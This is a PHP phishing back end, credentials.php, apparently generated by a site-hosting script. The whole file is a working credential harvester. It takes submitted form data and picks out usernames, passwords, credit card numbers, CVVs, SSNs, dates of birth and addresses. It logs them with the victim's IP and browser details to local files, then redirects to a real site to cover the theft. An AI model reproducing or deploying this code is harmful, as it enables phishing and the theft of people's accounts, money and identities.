<?php
// credentials.php - Script to capture phishing credentials
// This file is created by host_phishing_site.sh

// Set error reporting to capture all errors but not display them
error_reporting(E_ALL);
ini_set('display_errors', 0);

// Function to get the visitor's IP address
function getIP() {
    $ip = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ip = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ip = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ip = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ip = $_SERVER['REMOTE_ADDR'];
    else
        $ip = 'Unknown';
    return $ip;
}

// Initialize log files
$log_file = "credentials.txt";
$detailed_log = "detailed_capture.log";  // More detailed log for debugging
$date = date('Y-m-d H:i:s');
$ip = getIP();
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct Access';

// Get additional browser/device information
$browser_info = get_browser_info();
$device_type = determine_device_type($user_agent);

// Read the redirect URL from the file or use a default
$redirect_url = "https://www.google.com"; // Default fallback
if (file_exists('redirect_url.txt')) {
    $redirect_url = trim(file_get_contents('redirect_url.txt'));
}

// Create log entry header
$log_entry = "==== CREDENTIALS CAPTURED AT $date ====\n";
$log_entry .= "IP Address: $ip\n";
$log_entry .= "User Agent: $user_agent\n";
$log_entry .= "Browser: {$browser_info['browser']} {$browser_info['version']}\n";
$log_entry .= "OS: {$browser_info['platform']}\n";
$log_entry .= "Device Type: $device_type\n";
$log_entry .= "Referer: $referer\n";
$log_entry .= "Form Data:\n";

// Create a more detailed log entry for debugging
$debug_entry = $log_entry . "Raw POST data: " . print_r($_POST, true) . "\n\n";
file_put_contents($detailed_log, $debug_entry, FILE_APPEND);

// Capture all POST data
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Expanded list of common username/email field names
    $username_fields = [
        'username', 'user', 'email', 'login', 'name', 'account', 'emailaddress', 'userid', 
        'signin', 'id', 'mail', 'user_login', 'user_name', 'user_email', 'auth_email',
        'auth_user', 'auth_username', 'identification', 'loginid', 'session_key', 
        'user-name', 'user-id', 'user-login', 'user-email', 'email-address'
    ];
    
    // Expanded list of password field names
    $password_fields = [
        'password', 'pass', 'pwd', 'passwd', 'passw', 'ap_password', 'auth_pass', 
        'user_pass', 'user_password', 'user_pwd', 'userpass', 'userpassword', 
        'passwrd', 'user-password', 'user-pass', 'session_password', 'login_password'
    ];
    
    $found_username = false;
    $found_password = false;
    $username_value = '';
    $password_value = '';
    
    // First, check for common password fields using input type="password"
    if (empty($password_value)) {
        foreach ($_POST as $key => $value) {
            if (is_string($key) && is_string($value) && !empty($value)) {
                if (preg_match('/pass|pwd|passwd/i', $key)) {
                    $password_value = $value;
                    $log_entry .= "PASSWORD: $value (Field: $key)\n";
                    $found_password = true;
                    break;
                }
            }
        }
    }
    
    // Process each POST field to find username and other sensitive data
    foreach ($_POST as $key => $value) {
        // Skip empty values or non-string values
        if (empty($value) || !is_string($value)) {
            continue;
        }
        
        // Try to identify username/email fields
        $key_lower = strtolower($key);
        
        // Check if this field is likely a username/email
        if (!$found_username) {
            if (in_array($key_lower, $username_fields) || 
                strpos($key_lower, 'user') !== false || 
                strpos($key_lower, 'email') !== false || 
                strpos($key_lower, 'login') !== false ||
                strpos($key_lower, 'id') !== false) {
                
                // Additional validation for email format
                if (filter_var($value, FILTER_VALIDATE_EMAIL) || 
                    !preg_match('/password|pwd|pass/i', $key_lower)) {
                    $username_value = $value;
                    $log_entry .= "USERNAME/EMAIL: $value (Field: $key)\n";
                    $found_username = true;
                    continue;
                }
            }
        }
        
        // If we haven't found a password yet, check this field
        if (!$found_password) {
            if (in_array($key_lower, $password_fields) || 
                strpos($key_lower, 'pass') !== false || 
                strpos($key_lower, 'pwd') !== false) {
                $password_value = $value;
                $log_entry .= "PASSWORD: $value (Field: $key)\n";
                $found_password = true;
                continue;
            }
        }
        
        // Check for other potentially sensitive information
        if (preg_match('/(card|cc|credit).*(number|num|no)/i', $key_lower)) {
            $log_entry .= "CREDIT CARD: $value (Field: $key)\n";
            continue;
        }
        
        if (preg_match('/(cvv|cvc|security.?code|card.?verification)/i', $key_lower)) {
            $log_entry .= "CVV/CVC: $value (Field: $key)\n";
            continue;
        }
        
        if (preg_match('/(exp|expir).*(date|month|year)/i', $key_lower)) {
            $log_entry .= "EXPIRATION: $value (Field: $key)\n";
            continue;
        }
        
        if (preg_match('/(ssn|social.?security)/i', $key_lower)) {
            $log_entry .= "SSN: $value (Field: $key)\n";
            continue;
        }
        
        if (preg_match('/(dob|birth.?date|birth.?day)/i', $key_lower)) {
            $log_entry .= "DATE OF BIRTH: $value (Field: $key)\n";
            continue;
        }
        
        if (preg_match('/(phone|mobile|cell)/i', $key_lower)) {
            $log_entry .= "PHONE: $value (Field: $key)\n";
            continue;
        }
        
        if (preg_match('/(address|street|city|state|zip|postal)/i', $key_lower)) {
            $log_entry .= "ADDRESS: $value (Field: $key)\n";
            continue;
        }
        
        // Log other fields
        $log_entry .= "$key: $value\n";
    }
    
    // If no credentials were found using field names, try to guess based on content
    if (!$found_username && !$found_password) {
        $potential_usernames = [];
        $potential_passwords = [];
        
        foreach ($_POST as $key => $value) {
            if (!is_string($value) || empty($value)) continue;
            
            // Email pattern check for username
            if (filter_var($value, FILTER_VALIDATE_EMAIL)) {
                $potential_usernames[$key] = $value;
            }
            // Password pattern check (8+ chars with mix of types)
            else if (strlen($value) >= 8 && 
                     preg_match('/[a-zA-Z]/', $value) && 
                     preg_match('/[0-9!@#$%^&*(),.?":{}|<>]/', $value)) {
                $potential_passwords[$key] = $value;
            }
            // Username patterns (not looking like passwords)
            else if (strlen($value) >= 3 && 
                     strlen($value) <= 30 && 
                     !preg_match('/password|pwd|pass/i', $key)) {
                $potential_usernames[$key] = $value;
            }
        }
        
        // Extract first potential username and password
        if (!empty($potential_usernames)) {
            $first_key = array_key_first($potential_usernames);
            $username_value = $potential_usernames[$first_key];
            $log_entry .= "LIKELY USERNAME: $username_value (Field: $first_key)\n";
            $found_username = true;
        }
        
        if (!empty($potential_passwords)) {
            $first_key = array_key_first($potential_passwords);
            $password_value = $potential_passwords[$first_key];
            $log_entry .= "LIKELY PASSWORD: $password_value (Field: $first_key)\n";
            $found_password = true;
        }
    }
    
    // If we still couldn't identify username/password fields, log a complete dump
    if (!$found_username || !$found_password) {
        $log_entry .= "\nCOMPLETE FORM DATA DUMP:\n";
        foreach ($_POST as $key => $value) {
            if (is_string($value)) {
                $log_entry .= "$key: $value\n";
            }
        }
    }
    
    // Add a log entry specifically for easy processing
    $log_entry .= "\nEXTRACTED CREDENTIALS SUMMARY:\n";
    $log_entry .= "Username/Email: " . ($found_username ? $username_value : "Not found") . "\n";
    $log_entry .= "Password: " . ($found_password ? $password_value : "Not found") . "\n";
} else {
    $log_entry .= "No POST data received\n";
}

$log_entry .= "==== END OF ENTRY ====\n\n";

// Write to log file
file_put_contents($log_file, $log_entry, FILE_APPEND);

// Function to get browser details
function get_browser_info() {
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
    $browser = 'Unknown';
    $platform = 'Unknown';
    $version = 'Unknown';
    
    // Platform
    if (preg_match('/linux/i', $u_agent)) {
        $platform = 'Linux';
    } elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
        $platform = 'Mac';
    } elseif (preg_match('/windows|win32/i', $u_agent)) {
        $platform = 'Windows';
    } elseif (preg_match('/android/i', $u_agent)) {
        $platform = 'Android';
    } elseif (preg_match('/iphone|ipad/i', $u_agent)) {
        $platform = 'iOS';
    }
    
    // Browser
    if (preg_match('/MSIE/i', $u_agent) || preg_match('/Trident/i', $u_agent)) {
        $browser = 'Internet Explorer';
        if (preg_match('/Trident/i', $u_agent) && preg_match('/rv:([0-9.]+)/', $u_agent, $matches)) {
            $version = $matches[1];
        } else if (preg_match('/MSIE ([0-9.]+)/', $u_agent, $matches)) {
            $version = $matches[1];
        }
    } elseif (preg_match('/Edge/i', $u_agent)) {
        $browser = 'Edge';
        preg_match('/Edge\/([0-9.]+)/', $u_agent, $matches);
        $version = isset($matches[1]) ? $matches[1] : '';
    } elseif (preg_match('/Edg/i', $u_agent)) {
        $browser = 'Edge (Chromium)';
        preg_match('/Edg\/([0-9.]+)/', $u_agent, $matches);
        $version = isset($matches[1]) ? $matches[1] : '';
    } elseif (preg_match('/Firefox/i', $u_agent)) {
        $browser = 'Firefox';
        preg_match('/Firefox\/([0-9.]+)/', $u_agent, $matches);
        $version = isset($matches[1]) ? $matches[1] : '';
    } elseif (preg_match('/Chrome/i', $u_agent) && !preg_match('/OPR/i', $u_agent)) {
        $browser = 'Chrome';
        preg_match('/Chrome\/([0-9.]+)/', $u_agent, $matches);
        $version = isset($matches[1]) ? $matches[1] : '';
    } elseif (preg_match('/Safari/i', $u_agent) && !preg_match('/Chrome/i', $u_agent)) {
        $browser = 'Safari';
        preg_match('/Version\/([0-9.]+)/', $u_agent, $matches);
        $version = isset($matches[1]) ? $matches[1] : '';
    } elseif (preg_match('/Opera/i', $u_agent) || preg_match('/OPR/i', $u_agent)) {
        $browser = 'Opera';
        if (preg_match('/OPR/i', $u_agent)) {
            preg_match('/OPR\/([0-9.]+)/', $u_agent, $matches);
        } else {
            preg_match('/Version\/([0-9.]+)/', $u_agent, $matches);
        }
        $version = isset($matches[1]) ? $matches[1] : '';
    }
    
    return array(
        'browser' => $browser,
        'version' => $version,
        'platform' => $platform
    );
}

// Function to determine device type
function determine_device_type($user_agent) {
    if (preg_match('/mobile|android|iphone|ipad|phone/i', $user_agent)) {
        if (preg_match('/tablet|ipad/i', $user_agent)) {
            return 'Tablet';
        }
        return 'Mobile';
    }
    return 'Desktop';
}

// Create a simple console output for real-time monitoring
echo "SUCCESS! Credentials have been captured and saved!\n";
if (isset($username_value) && !empty($username_value)) {
    echo "Username/Email: $username_value\n";
}
if (isset($password_value) && !empty($password_value)) {
    echo "Password: $password_value\n";
}

// Redirect to legitimate site
header("Location: $redirect_url");
exit;
?> 